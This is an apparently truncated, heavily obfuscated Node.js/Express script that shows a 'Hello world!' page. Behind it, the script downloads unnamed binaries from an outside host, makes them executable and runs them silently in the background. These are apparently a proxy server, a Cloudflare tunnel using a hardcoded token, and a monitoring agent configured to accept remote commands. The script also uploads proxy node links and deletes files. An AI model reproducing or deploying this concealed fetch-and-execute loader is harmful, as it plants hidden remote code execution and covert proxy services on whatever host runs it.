const _0x31f0e8=_0x16a9;(function(_0x3aaa21,_0x3ee310){const _0x42808f={_0x473e27:0x10d,_0x444d95:0x123,_0x2c154a:0x117,_0x4882cb:0x16e,_0x461bf6:0xf3,_0x506176:0xf4},_0x8606ed=_0x16a9,_0x587247=_0x3aaa21();while(!![]){try{const _0x36242e=parseInt(_0x8606ed(_0x42808f._0x473e27))/0x1*(parseInt(_0x8606ed(_0x42808f._0x444d95))/0x2)+parseInt(_0x8606ed(0x15c))/0x3*(parseInt(_0x8606ed(0x16d))/0x4)+parseInt(_0x8606ed(0x114))/0x5*(parseInt(_0x8606ed(_0x42808f._0x2c154a))/0x6)+parseInt(_0x8606ed(_0x42808f._0x4882cb))/0x7*(-parseInt(_0x8606ed(_0x42808f._0x461bf6))/0x8)+-parseInt(_0x8606ed(_0x42808f._0x506176))/0x9*(parseInt(_0x8606ed(0xde))/0xa)+parseInt(_0x8606ed(0x167))/0xb+-parseInt(_0x8606ed(0xe2))/0xc;if(_0x36242e===_0x3ee310)break;else _0x587247['push'](_0x587247['shift']());}catch(_0x775798){_0x587247['push'](_0x587247['shift']());}}}(_0x4586,0xf345d));const express=require(_0x31f0e8(0xdc)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x31f0e8(0x188)),{promisify}=require(_0x31f0e8(0xe3)),exec=promisify(require(_0x31f0e8(0xda))[_0x31f0e8(0x133)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x31f0e8(0x10e)]||'',PROJECT_URL=process[_0x31f0e8(0xfe)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x31f0e8(0xfe)][_0x31f0e8(0x140)]||![],FILE_PATH=process[_0x31f0e8(0xfe)][_0x31f0e8(0xd9)]||_0x31f0e8(0xff),SUB_PATH=process[_0x31f0e8(0xfe)]['SUB_PATH']||_0x31f0e8(0xfb),PORT=process[_0x31f0e8(0xfe)][_0x31f0e8(0x18d)]||process[_0x31f0e8(0xfe)][_0x31f0e8(0x128)]||0xbb8,UUID=process[_0x31f0e8(0xfe)]['UUID']||'4e10c5d7-85d7-4922-8774-38c3e151c3d6',NEZHA_SERVER=process[_0x31f0e8(0xfe)][_0x31f0e8(0x120)]||'',NEZHA_PORT=process['env'][_0x31f0e8(0xfd)]||'',NEZHA_KEY=process[_0x31f0e8(0xfe)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x31f0e8(0xfe)][_0x31f0e8(0x139)]||_0x31f0e8(0x141),ARGO_AUTH=process[_0x31f0e8(0xfe)][_0x31f0e8(0x132)]||_0x31f0e8(0x101),ARGO_PORT=process['env'][_0x31f0e8(0x17b)]||0x1f41,CFIP=process[_0x31f0e8(0xfe)][_0x31f0e8(0xe5)]||'cdns.doon.eu.org',CFPORT=process[_0x31f0e8(0xfe)][_0x31f0e8(0x103)]||0x1bb,NAME=process[_0x31f0e8(0xfe)][_0x31f0e8(0xd3)]||_0x31f0e8(0x107);!fs[_0x31f0e8(0x130)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x31f0e8(0x14b))):console[_0x31f0e8(0xea)](FILE_PATH+_0x31f0e8(0xe4));function generateRandomName(){const _0x5d63c8={_0x8c8f76:0xd6,_0x3f5c6a:0x119},_0x5d82e5=_0x31f0e8,_0x45dc39=_0x5d82e5(_0x5d63c8._0x8c8f76);let _0x70a43c='';for(let _0x2421bd=0x0;_0x2421bd<0x6;_0x2421bd++){_0x70a43c+=_0x45dc39[_0x5d82e5(0x12a)](Math['floor'](Math[_0x5d82e5(0xdf)]()*_0x45dc39[_0x5d82e5(_0x5d63c8._0x3f5c6a)]));}return _0x70a43c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x31f0e8(0x174)](FILE_PATH,npmName),phpPath=path[_0x31f0e8(0x174)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x31f0e8(0x174)](FILE_PATH,botName),subPath=path[_0x31f0e8(0x174)](FILE_PATH,_0x31f0e8(0x14c)),listPath=path[_0x31f0e8(0x174)](FILE_PATH,_0x31f0e8(0xf9)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x44f42d={_0xb74d1f:0x12c,_0x89db93:0x152,_0xa20878:0x177,_0x39831b:0x116},_0xcf6414=_0x31f0e8;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3953d2;try{_0x3953d2=fs[_0xcf6414(0x166)](subPath,'utf-8');}catch{return null;}const _0x1dbafe=Buffer[_0xcf6414(0x10a)](_0x3953d2,_0xcf6414(_0x44f42d._0xb74d1f))[_0xcf6414(_0x44f42d._0x89db93)](_0xcf6414(0xeb)),_0x289048=_0x1dbafe[_0xcf6414(0x172)]('\x0a')['filter'](_0x288674=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x288674));if(_0x289048['length']===0x0)return;return axios[_0xcf6414(_0x44f42d._0xa20878)](UPLOAD_URL+_0xcf6414(0x12f),JSON[_0xcf6414(0x105)]({'nodes':_0x289048}),{'headers':{'Content-Type':_0xcf6414(_0x44f42d._0x39831b)}})['catch'](_0x1130d6=>{return null;}),null;}catch(_0x5e65ff){return null;}}function cleanupOldFiles(){const _0x49b04b={_0x36cd7b:0x15f},_0x47cf7b={_0x5790fb:0x112},_0x515e4c=_0x31f0e8;try{const _0x5cc720=fs[_0x515e4c(0x10c)](FILE_PATH);_0x5cc720[_0x515e4c(_0x49b04b._0x36cd7b)](_0x32f9bc=>{const _0x2e8f19=_0x515e4c,_0x471d0c=path[_0x2e8f19(0x174)](FILE_PATH,_0x32f9bc);try{const _0x1c490d=fs['statSync'](_0x471d0c);_0x1c490d[_0x2e8f19(0x15e)]()&&fs[_0x2e8f19(_0x47cf7b._0x5790fb)](_0x471d0c);}catch(_0x28d6e4){}});}catch(_0x2611f3){}}app[_0x31f0e8(0x137)]('/',function(_0x2909c3,_0xabfac3){const _0x39e729=_0x31f0e8;_0xabfac3[_0x39e729(0x179)](_0x39e729(0x183));});async function generateConfig(){const _0xd63f98={_0x4fa99f:0x163,_0xbed604:0xe0,_0x249222:0x158,_0x433436:0x178,_0x4ae0c5:0x164,_0x5eeb38:0x146,_0x59f555:0x121,_0x2cb0e6:0x186,_0x42a7c4:0x164,_0x389f4c:0x153,_0x3b0313:0x15b,_0x5d0dc2:0xd7,_0xeab52a:0x129,_0x442302:0x174},_0x202435=_0x31f0e8,_0x5d80fd={'log':{'access':_0x202435(_0xd63f98._0x4fa99f),'error':_0x202435(0x163),'loglevel':_0x202435(_0xd63f98._0xbed604)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x202435(_0xd63f98._0x249222)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x202435(_0xd63f98._0x433436),'dest':0xbba},{'path':_0x202435(0x184),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x202435(0xec)}},{'port':0xbb9,'listen':_0x202435(_0xd63f98._0x4ae0c5),'protocol':_0x202435(_0xd63f98._0x5eeb38),'settings':{'clients':[{'id':UUID}],'decryption':_0x202435(0xe0)},'streamSettings':{'network':'tcp','security':_0x202435(0xe0)}},{'port':0xbba,'listen':_0x202435(_0xd63f98._0x4ae0c5),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x202435(0xe0)},'streamSettings':{'network':'ws','security':_0x202435(0xe0),'wsSettings':{'path':_0x202435(_0xd63f98._0x433436)}},'sniffing':{'enabled':!![],'destOverride':[_0x202435(_0xd63f98._0x59f555),'tls',_0x202435(_0xd63f98._0x2cb0e6)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x202435(_0xd63f98._0x42a7c4),'protocol':_0x202435(_0xd63f98._0x389f4c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x202435(0x121),_0x202435(0x135),_0x202435(0x186)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x202435(0x13e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x202435(_0xd63f98._0xbed604),'wsSettings':{'path':_0x202435(0x180)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x202435(0x135),_0x202435(_0xd63f98._0x2cb0e6)],'metadataOnly':![]}}],'dns':{'servers':[_0x202435(_0xd63f98._0x3b0313)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x202435(_0xd63f98._0x5d0dc2)}]};fs[_0x202435(_0xd63f98._0xeab52a)](path[_0x202435(_0xd63f98._0x442302)](FILE_PATH,'config.json'),JSON[_0x202435(0x105)](_0x5d80fd,null,0x2));}function getSystemArchitecture(){const _0x42d340={_0x206c49:0x127,_0x34076f:0x173,_0x248728:0x11e},_0x31451d=_0x31f0e8,_0x589918=os['arch']();return _0x589918==='arm'||_0x589918===_0x31451d(0xd4)||_0x589918===_0x31451d(_0x42d340._0x206c49)?_0x31451d(_0x42d340._0x34076f):_0x31451d(_0x42d340._0x248728);}function downloadFile(_0x5e2f9c,_0xbc9e71,_0x13cb85){const _0x28c730={_0x1d2948:0x181,_0x141320:0x137,_0x2e5796:0x10f},_0x212343={_0x53cd13:0x169,_0x595d3c:0x18c},_0x16f9b8={_0x36df8a:0x11a,_0x22e679:0x12e},_0x4a15e9={_0x25dce3:0x125,_0x4bb9cb:0x18c},_0x208f53=_0x31f0e8,_0x28cbf6=_0x5e2f9c;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2d0018=fs[_0x208f53(_0x28c730._0x1d2948)](_0x28cbf6);axios({'method':_0x208f53(_0x28c730._0x141320),'url':_0xbc9e71,'responseType':'stream'})[_0x208f53(0x14f)](_0x356541=>{const _0x5c4346={_0x5e0314:0x18c,_0x1f5b76:0x160},_0x18f293=_0x208f53;_0x356541[_0x18f293(_0x16f9b8._0x36df8a)][_0x18f293(_0x16f9b8._0x22e679)](_0x2d0018),_0x2d0018['on'](_0x18f293(0x13b),()=>{const _0xbdd01b=_0x18f293;_0x2d0018[_0xbdd01b(_0x4a15e9._0x25dce3)](),console['log']('Download\x20'+path[_0xbdd01b(_0x4a15e9._0x4bb9cb)](_0x28cbf6)+'\x20successfully'),_0x13cb85(null,_0x28cbf6);}),_0x2d0018['on']('error',_0x41de43=>{const _0x9d55da=_0x18f293;fs['unlink'](_0x28cbf6,()=>{});const _0x3c59a8=_0x9d55da(0x169)+path[_0x9d55da(_0x5c4346._0x5e0314)](_0x28cbf6)+_0x9d55da(0xdb)+_0x41de43[_0x9d55da(0x171)];console[_0x9d55da(_0x5c4346._0x1f5b76)](_0x3c59a8),_0x13cb85(_0x3c59a8);});})[_0x208f53(_0x28c730._0x2e5796)](_0x426a8f=>{const _0x509563=_0x208f53,_0x50aa8c=_0x509563(_0x212343._0x53cd13)+path[_0x509563(_0x212343._0x595d3c)](_0x28cbf6)+_0x509563(0xdb)+_0x426a8f[_0x509563(0x171)];console[_0x509563(0x160)](_0x50aa8c),_0x13cb85(_0x50aa8c);});}async function downloadFilesAndRun(){const _0x105b2a={_0x5bbe0d:0x119,_0x3056af:0x156,_0x47daf1:0xd0,_0x39dddc:0x172,_0x4d512e:0x14e,_0x5ecf7a:0x182,_0x280f3b:0xe1,_0x54b54a:0x17c,_0x1a4d70:0x11f,_0x444831:0x155,_0x4d6d38:0x17a,_0x8c619c:0x129,_0x5c3f0d:0xef,_0x26b90e:0x17e,_0x1f3bcf:0x115,_0x35a05d:0xe7,_0x2eed77:0xf5,_0x2e24db:0xf0,_0x3d00b4:0x160,_0x4cc3f7:0xea,_0x535a85:0x10b,_0x1f8354:0x109,_0x1e2bc6:0xea,_0x566d11:0x17e,_0x343016:0x160,_0x35ead5:0x15a,_0x48b42b:0x189},_0x15fad4={_0x5f1912:0x130,_0x49252f:0x16c},_0x5ee2f1=_0x31f0e8,_0x22c7d2=getSystemArchitecture(),_0x169eaf=getFilesForArchitecture(_0x22c7d2);if(_0x169eaf[_0x5ee2f1(_0x105b2a._0x5bbe0d)]===0x0){console[_0x5ee2f1(0xea)](_0x5ee2f1(_0x105b2a._0x3056af));return;}const _0x2ca6db=_0x169eaf[_0x5ee2f1(0x104)](_0x352bec=>{return new Promise((_0x3a3ded,_0x4c49bd)=>{const _0x5b08b8=_0x16a9;downloadFile(_0x352bec[_0x5b08b8(0x17d)],_0x352bec[_0x5b08b8(0x147)],(_0x57b68e,_0x1e328b)=>{_0x57b68e?_0x4c49bd(_0x57b68e):_0x3a3ded(_0x1e328b);});});});try{await Promise[_0x5ee2f1(_0x105b2a._0x47daf1)](_0x2ca6db);}catch(_0x1c209e){console[_0x5ee2f1(0x160)]('Error\x20downloading\x20files:',_0x1c209e);return;}function _0x59696e(_0x251796){const _0x2b70fd={_0x4eaaad:0x160,_0x21d9f7:0xea,_0x541fb4:0x175},_0x9e9e80=_0x5ee2f1,_0x25358d=0x1fd;_0x251796[_0x9e9e80(0x15f)](_0x5cf205=>{const _0x59bb74=_0x9e9e80;fs[_0x59bb74(_0x15fad4._0x5f1912)](_0x5cf205)&&fs[_0x59bb74(_0x15fad4._0x49252f)](_0x5cf205,_0x25358d,_0x4d98b5=>{const _0x17ba1d=_0x59bb74;_0x4d98b5?console[_0x17ba1d(_0x2b70fd._0x4eaaad)]('Empowerment\x20failed\x20for\x20'+_0x5cf205+':\x20'+_0x4d98b5):console[_0x17ba1d(_0x2b70fd._0x21d9f7)](_0x17ba1d(_0x2b70fd._0x541fb4)+_0x5cf205+':\x20'+_0x25358d[_0x17ba1d(0x152)](0x8));});});}const _0x242480=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x59696e(_0x242480);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5f0ff7=NEZHA_SERVER[_0x5ee2f1(0xf5)](':')?NEZHA_SERVER[_0x5ee2f1(_0x105b2a._0x39dddc)](':')['pop']():'',_0x4eac13=new Set([_0x5ee2f1(_0x105b2a._0x4d512e),_0x5ee2f1(_0x105b2a._0x5ecf7a),_0x5ee2f1(_0x105b2a._0x280f3b),_0x5ee2f1(0x15d),_0x5ee2f1(0xd8),'2053']),_0x510c93=_0x4eac13['has'](_0x5f0ff7)?_0x5ee2f1(_0x105b2a._0x54b54a):_0x5ee2f1(0x110),_0x5b929d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5ee2f1(_0x105b2a._0x1a4d70)+NEZHA_SERVER+_0x5ee2f1(_0x105b2a._0x444831)+_0x510c93+_0x5ee2f1(_0x105b2a._0x4d6d38)+UUID;fs[_0x5ee2f1(_0x105b2a._0x8c619c)](path[_0x5ee2f1(0x174)](FILE_PATH,'config.yaml'),_0x5b929d);const _0x574759=_0x5ee2f1(0x144)+phpPath+_0x5ee2f1(_0x105b2a._0x5c3f0d)+FILE_PATH+_0x5ee2f1(0x165);try{await exec(_0x574759),console[_0x5ee2f1(0xea)](phpName+_0x5ee2f1(_0x105b2a._0x26b90e)),await new Promise(_0x40037e=>setTimeout(_0x40037e,0x3e8));}catch(_0x473fc3){console['error'](_0x5ee2f1(_0x105b2a._0x1f3bcf)+_0x473fc3);}}else{let _0x4bd430='';const _0x505997=[_0x5ee2f1(_0x105b2a._0x4d512e),_0x5ee2f1(0x182),_0x5ee2f1(0xe1),_0x5ee2f1(0x15d),_0x5ee2f1(0xd8),_0x5ee2f1(_0x105b2a._0x35a05d)];_0x505997[_0x5ee2f1(_0x105b2a._0x2eed77)](NEZHA_PORT)&&(_0x4bd430=_0x5ee2f1(0xe8));const _0x2ded58='nohup\x20'+npmPath+_0x5ee2f1(_0x105b2a._0x2e24db)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4bd430+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2ded58),console[_0x5ee2f1(0xea)](npmName+_0x5ee2f1(_0x105b2a._0x26b90e)),await new Promise(_0x4a38cc=>setTimeout(_0x4a38cc,0x3e8));}catch(_0x888d3f){console[_0x5ee2f1(_0x105b2a._0x3d00b4)](_0x5ee2f1(0xee)+_0x888d3f);}}}else console[_0x5ee2f1(_0x105b2a._0x4cc3f7)](_0x5ee2f1(0x150));const _0x497ebf='nohup\x20'+webPath+_0x5ee2f1(_0x105b2a._0x535a85)+FILE_PATH+_0x5ee2f1(_0x105b2a._0x1f8354);try{await exec(_0x497ebf),console[_0x5ee2f1(_0x105b2a._0x1e2bc6)](webName+_0x5ee2f1(_0x105b2a._0x566d11)),await new Promise(_0xb1945=>setTimeout(_0xb1945,0x3e8));}catch(_0x19d01f){console[_0x5ee2f1(_0x105b2a._0x343016)]('web\x20running\x20error:\x20'+_0x19d01f);}if(fs[_0x5ee2f1(0x130)](botPath)){let _0x20f3db;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x20f3db=_0x5ee2f1(0x157)+ARGO_AUTH;else ARGO_AUTH[_0x5ee2f1(0x11c)](/TunnelSecret/)?_0x20f3db=_0x5ee2f1(0x108)+FILE_PATH+_0x5ee2f1(0xce):_0x20f3db=_0x5ee2f1(0x149)+FILE_PATH+_0x5ee2f1(_0x105b2a._0x35ead5)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x20f3db+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x5ee2f1(_0x105b2a._0x566d11)),await new Promise(_0x4a247f=>setTimeout(_0x4a247f,0x7d0));}catch(_0x51cd08){console[_0x5ee2f1(0x160)](_0x5ee2f1(_0x105b2a._0x48b42b)+_0x51cd08);}}await new Promise(_0x4dd718=>setTimeout(_0x4dd718,0x1388));}function getFilesForArchitecture(_0xea5c9b){const _0x316a08={_0x4bc591:0x118,_0x581789:0x173,_0x258138:0x185},_0x8809a7=_0x31f0e8;let _0x48ad3e;_0xea5c9b===_0x8809a7(0x173)?_0x48ad3e=[{'fileName':webPath,'fileUrl':_0x8809a7(0xf2)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x48ad3e=[{'fileName':webPath,'fileUrl':_0x8809a7(_0x316a08._0x4bc591)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x461846=_0xea5c9b==='arm'?_0x8809a7(0xd2):_0x8809a7(0x16a);_0x48ad3e['unshift']({'fileName':npmPath,'fileUrl':_0x461846});}else{const _0x5297c7=_0xea5c9b===_0x8809a7(_0x316a08._0x581789)?_0x8809a7(_0x316a08._0x258138):'https://amd64.ssss.nyc.mn/v1';_0x48ad3e[_0x8809a7(0xcf)]({'fileName':phpPath,'fileUrl':_0x5297c7});}}return _0x48ad3e;}function _0x4586(){const _0x5cd208=['trojan','&path=%2Fvless-argo%3Fed%3D2560#','AUTO_ACCESS','260121.wbz232.de5.net','response','listen','nohup\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','vless','fileUrl','Add\x20automatic\x20access\x20task\x20faild:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Content-Type','\x20is\x20created','sub.txt','TunnelSecret','443','then','NEZHA\x20variable\x20is\x20empty,skip\x20running','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','toString','vmess','http://ip-api.com/json/','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','xtls-rprx-vision','substring','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https+local://8.8.8.8/dns-query','1315254ydiISk','2087','isFile','forEach','error','\x0a\x0atrojan://','ArgoDomain:','/dev/null','127.0.0.1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','readFileSync','13834337JdaAsi','Subscription\x20uploaded\x20successfully','Download\x20','https://amd64.ssss.nyc.mn/agent','Unknown','chmod','4xHNJiu','2373qIeNPQ','set','countryCode','message','split','arm','join','Empowerment\x20success\x20for\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','post','/vless-argo','send','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ARGO_PORT','true','fileName','\x20is\x20running','country_code','/trojan-argo','createWriteStream','8443','Hello\x20world!','/vmess-argo','https://arm64.ssss.nyc.mn/v1','quic','\x22\x20>\x20/dev/null\x202>&1','path','Error\x20executing\x20command:\x20','taskkill\x20/f\x20/im\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','basename','SERVER_PORT','Error\x20in\x20startserver:','/tunnel.yml\x20run','unshift','all','clear','https://arm64.ssss.nyc.mn/agent','NAME','arm64','text/plain;\x20charset=utf-8','abcdefghijklmnopqrstuvwxyz','block','2083','FILE_PATH','child_process','\x20failed:\x20','express','rm\x20-rf\x20','1057660ATCfLq','random','none','2096','24893268jkiUqd','util','\x20already\x20exists','CFIP','&path=%2Ftrojan-argo%3Fed%3D2560#','2053','--tls','?encryption=none&security=tls&sni=','log','utf-8','tcp','push','npm\x20running\x20error:\x20','\x20-c\x20\x22','\x20-s\x20','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/web','18104grvaJb','27tSyrhN','includes','\x0a\x0avmess://','/sub.txt\x20saved\x20successfully','\x20>/dev/null\x202>&1\x20&','list.txt','org','sub','\x20>\x20nul\x202>&1','NEZHA_PORT','env','./tmp','tunnel.json','eyJhIjoiZDYyZDJjNTVlYmRjZjBmOTY1ZmQyNWNjNGY4YTkwZTMiLCJ0IjoiYWM3MGRlY2UtZWVhNS00ZjU2LWI4YmEtOGE4NTNjYmNmMTg1IiwicyI6IlpEWTFOVGt3WVdVdE5XVm1ZeTAwWlRNMUxUbGtNekV0TVdFd05UZGtNMlUzTnpNeiJ9','Nodes\x20uploaded\x20successfully','CFPORT','map','stringify','boot.log','abing260121','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/config.json\x20>/dev/null\x202>&1\x20&','from','\x20-c\x20','readdirSync','8dCKamX','UPLOAD_URL','catch','false','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','unlinkSync','https://ipapi.co/json/','408990QihbNJ','php\x20running\x20error:\x20','application/json','102JvbgQs','https://amd64.ssss.nyc.mn/web','length','data','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','match','/vmess-argo?ed=2560','amd','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_SERVER','http','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','267172NdLgHJ','status','close','&fp=firefox&type=ws&host=','aarch64','PORT','writeFileSync','charAt','Skipping\x20adding\x20automatic\x20access\x20task','base64','del\x20/f\x20/q\x20','pipe','/api/delete-nodes','existsSync','firefox','ARGO_AUTH','exec','ARGO_DOMAIN:','tls','/api/add-nodes','get','platform','ARGO_DOMAIN','win32','finish','Unhandled\x20error\x20in\x20startserver:','?security=tls&sni='];_0x4586=function(){return _0x5cd208;};return _0x4586();}function argoType(){const _0x1d2f32={_0x224f1f:0xea,_0x1e6a29:0x151,_0x91602e:0xf5,_0x3e95fa:0x100,_0x575f56:0x129,_0x4596d8:0xea},_0x5b2429=_0x31f0e8;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5b2429(_0x1d2f32._0x224f1f)](_0x5b2429(_0x1d2f32._0x1e6a29));return;}if(ARGO_AUTH[_0x5b2429(_0x1d2f32._0x91602e)](_0x5b2429(0x14d))){fs['writeFileSync'](path['join'](FILE_PATH,_0x5b2429(0x100)),ARGO_AUTH);const _0x56accf='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x5b2429(0x172)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x5b2429(0x174)](FILE_PATH,_0x5b2429(_0x1d2f32._0x3e95fa))+_0x5b2429(0x145)+ARGO_DOMAIN+_0x5b2429(0x122)+ARGO_PORT+_0x5b2429(0x18b);fs[_0x5b2429(_0x1d2f32._0x575f56)](path['join'](FILE_PATH,'tunnel.yml'),_0x56accf);}else console[_0x5b2429(_0x1d2f32._0x4596d8)](_0x5b2429(0x111));}async function extractDomains(){const _0x200dad={_0xbd4e40:0x174,_0x14766c:0x172,_0x2da4d6:0xea,_0x42d56b:0x162,_0x4a26fa:0x112,_0x412e1b:0x144,_0x216c3a:0x17e},_0x3a7cd7={_0x5961c8:0x137,_0x45cae5:0x154,_0x20cfc5:0x11a,_0x418079:0x11a,_0x1e9cc8:0x124,_0x5b950d:0x170,_0x14eee5:0x11a},_0x39f8df={_0x18b235:0x12a,_0x22cc07:0x159},_0x1abbf6={_0x235f6c:0x11c},_0x548e6b=_0x31f0e8;let _0x137e83;if(ARGO_AUTH&&ARGO_DOMAIN)_0x137e83=ARGO_DOMAIN,console[_0x548e6b(0xea)](_0x548e6b(0x134),_0x137e83),await _0x280767(_0x137e83);else try{const _0x2de4db=fs[_0x548e6b(0x166)](path[_0x548e6b(_0x200dad._0xbd4e40)](FILE_PATH,'boot.log'),'utf-8'),_0x7fcdc6=_0x2de4db[_0x548e6b(_0x200dad._0x14766c)]('\x0a'),_0x46f9dd=[];_0x7fcdc6[_0x548e6b(0x15f)](_0x142c38=>{const _0x535a9e=_0x548e6b,_0x2c823c=_0x142c38[_0x535a9e(_0x1abbf6._0x235f6c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2c823c){const _0x1c2c38=_0x2c823c[0x1];_0x46f9dd[_0x535a9e(0xed)](_0x1c2c38);}});if(_0x46f9dd[_0x548e6b(0x119)]>0x0)_0x137e83=_0x46f9dd[0x0],console[_0x548e6b(_0x200dad._0x2da4d6)](_0x548e6b(_0x200dad._0x42d56b),_0x137e83),await _0x280767(_0x137e83);else{console['log'](_0x548e6b(0x176)),fs[_0x548e6b(_0x200dad._0x4a26fa)](path[_0x548e6b(0x174)](FILE_PATH,_0x548e6b(0x106)));async function _0x254c5e(){const _0x24959a=_0x548e6b;try{process[_0x24959a(0x138)]==='win32'?await exec(_0x24959a(0x18a)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x24959a(_0x39f8df._0x18b235)](0x0)+']'+botName[_0x24959a(_0x39f8df._0x22cc07)](0x1)+_0x24959a(0x187));}catch(_0x305c56){}}_0x254c5e(),await new Promise(_0x42eaaa=>setTimeout(_0x42eaaa,0xbb8));const _0x55a810=_0x548e6b(0x149)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x548e6b(_0x200dad._0x412e1b)+botPath+'\x20'+_0x55a810+_0x548e6b(0xf8)),console['log'](botName+_0x548e6b(_0x200dad._0x216c3a)),await new Promise(_0x3ff559=>setTimeout(_0x3ff559,0xbb8)),await extractDomains();}catch(_0x4fb46a){console['error']('Error\x20executing\x20command:\x20'+_0x4fb46a);}}}catch(_0x755ff5){console[_0x548e6b(0x160)](_0x548e6b(0xf1),_0x755ff5);}async function _0x19e125(){const _0x1eb213=_0x548e6b;try{const _0x521a66=await axios['get'](_0x1eb213(0x113),{'timeout':0xbb8});if(_0x521a66[_0x1eb213(0x11a)]&&_0x521a66['data'][_0x1eb213(0x17f)]&&_0x521a66['data'][_0x1eb213(0xfa)])return _0x521a66[_0x1eb213(0x11a)][_0x1eb213(0x17f)]+'_'+_0x521a66['data']['org'];}catch(_0x363497){try{const _0x1988fc=await axios[_0x1eb213(_0x3a7cd7._0x5961c8)](_0x1eb213(_0x3a7cd7._0x45cae5),{'timeout':0xbb8});if(_0x1988fc[_0x1eb213(_0x3a7cd7._0x20cfc5)]&&_0x1988fc[_0x1eb213(_0x3a7cd7._0x418079)][_0x1eb213(_0x3a7cd7._0x1e9cc8)]==='success'&&_0x1988fc[_0x1eb213(0x11a)][_0x1eb213(_0x3a7cd7._0x5b950d)]&&_0x1988fc[_0x1eb213(_0x3a7cd7._0x418079)][_0x1eb213(0xfa)])return _0x1988fc[_0x1eb213(0x11a)][_0x1eb213(_0x3a7cd7._0x5b950d)]+'_'+_0x1988fc[_0x1eb213(_0x3a7cd7._0x14eee5)][_0x1eb213(0xfa)];}catch(_0x3f9427){}}return _0x1eb213(0x16b);}async function _0x280767(_0x35c95a){const _0x22b675=await _0x19e125(),_0x555779=NAME?NAME+'-'+_0x22b675:_0x22b675;return new Promise(_0x2f01ea=>{const 